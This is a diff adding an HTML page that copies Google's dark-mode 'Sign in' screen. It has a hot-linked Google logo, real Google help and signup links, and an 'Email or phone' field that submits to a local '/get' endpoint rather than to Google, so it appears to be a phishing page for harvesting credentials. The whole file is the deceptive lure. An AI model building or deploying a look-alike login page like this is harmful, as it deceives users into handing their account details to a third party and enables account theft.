@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <style>
+      body {
+        background-color: rgb(0 0 0 / 1);
+	font-family: sans-serif;
+      }
+
+      .login-container {
+        width: 85%;
+        margin: auto;
+        padding: 20px;
+        border-radius: 5px;
+        margin-top: 10px;
+      }
+
+      #logo {
+        margin-top: 23px;
+        width: fit-content;
+      }
+
+      .g-h1 {
+	color: #e0e0e0
+        font-size: 25px;
+        text-align: left;
+        font-weight: 200;
+        margin: auto;
+      }
+
+      .g-h2 {
+	color: #e0e0e0
+        font-size: 15px;
+        text-align: left;
+        font-weight: 200;
+        margin: auto;
+      }
+
+      .g-input {
+        width: 95%;
+        height: 40px;
+        background-color: transparent;
+        font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
+	padding: 5px 12px 2px 12px;
+        line-height: 54px;
+        margin-bottom: 15px;
+        border: none;
+        border-radius: 5px;
+	color: #ffffff;
+        box-shadow: 0 0 0 0.8px #ffffff inset;
+        font-size: 20 px;
+      }
+
+      .create-account {
+        font-size: smaller;
+        color: #8ab4f8;
+        text-decoration: none;
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+        font-size: 15px;
+        letter-spacing: 0.25px;
+      }
+
+      .gbtn-primary {
+        min-width: 52px;
+        border: none;
+        margin-top: 6px;
+        margin-bottom: 6px;
+        height: 36px;
+        border-radius: 25px;
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+        font-size: 15px;
+        font-weight: 500;
+        padding: 0 24px 0 24px;
+        box-sizing: inherit;
+	background-color: #8ab4f8;;
+	color: #000;
+      }
+
+      .forgot-btn {
+          background: none;
+          border: none;
+          color: #8ab4f8;          /* Google-style blue for dark mode */
+          font-size: 14px;
+          cursor: pointer;
+          text-align: left;
+          margin: 5px 0 15px 5px;  /* spacing: top, right, bottom, left */
+          padding: 0;
+      }
+
+      .forgot-btn:hover {
+          text-decoration: underline;  /* underline on hover, like a link */
+      }
+
+      .button-container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .text {
+        font-family: Roboto, "Noto Sans Myanmar UI", Arial, sans-serif;
+        white-space: normal;
+        color: #5f6368;
+        font-size: 14px;
+        line-height: 1.4286;
+        padding-bottom: 3px;
+        padding-top: 9px;
+        box-sizing: inherit;
+      }
+
+      .txt {
+        text-decoration: none;
+        border-radius: 4px;
+        color: #8ab4f8;
+      }
+    </style>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+  </head>
+  <body>
+    <div class="login-container">
+      <div id="logo">
+	<img src="https://i.postimg.cc/J4gCR7ct/Screenshot-From-2025-09-07-20-43-35.png"
+             alt="Google Logo"
+             style="width: 60px; height: 60px;">
+      </div>
+      <form action="/get" id="email-form-step">
+        <h4></h4>
+        <h1 class="g-h1"><b style="font-size: 32px; color: #e0e0e0;">Sign in</b></h1>
+        <h3></h3>
+        <h2 class="g-h2"><b style="font-size: 17px; color: #e0e0e0">Use your Google Account</b></h2>
+        <h6></h6>
+        <div class="login-content">
+          <form method="POST">
+            <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
+          </form>
+	    <button type="button" class="forgot-btn">Forgot email?</button>
+          <div class="text">Not your device? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773?hl=en" class="txt" aria-label="a">Learn more about using Guest mode</a>
+          </div>
+          <h5></h5>
+          <div class="button-container">
+            <a class="create-account" href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://accounts.google.com/&dsh=S1493291513:1757247160389660&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://accounts.google.com/&ifkv=AfYwgwWqZikXaQd2W33xU7UvzD07wOy-Im6pn5LCU6EPV_joVI2qzsVjgvcfhnHGgrMcGIKAv3Dl2g&TL=ALgCv6z4F8fQVyc7hzSULQrAcx6tslnNYFYQ8derSAdvwPQdM6Tve2peLh7HzgOV">Create account</a>
+            <button class="gbtn-primary" type="submit">Next</button>
+          </div>
+        </div>
+      </form>
+    </div>
+    </div>
+    </div>
+  </body>
+</html>
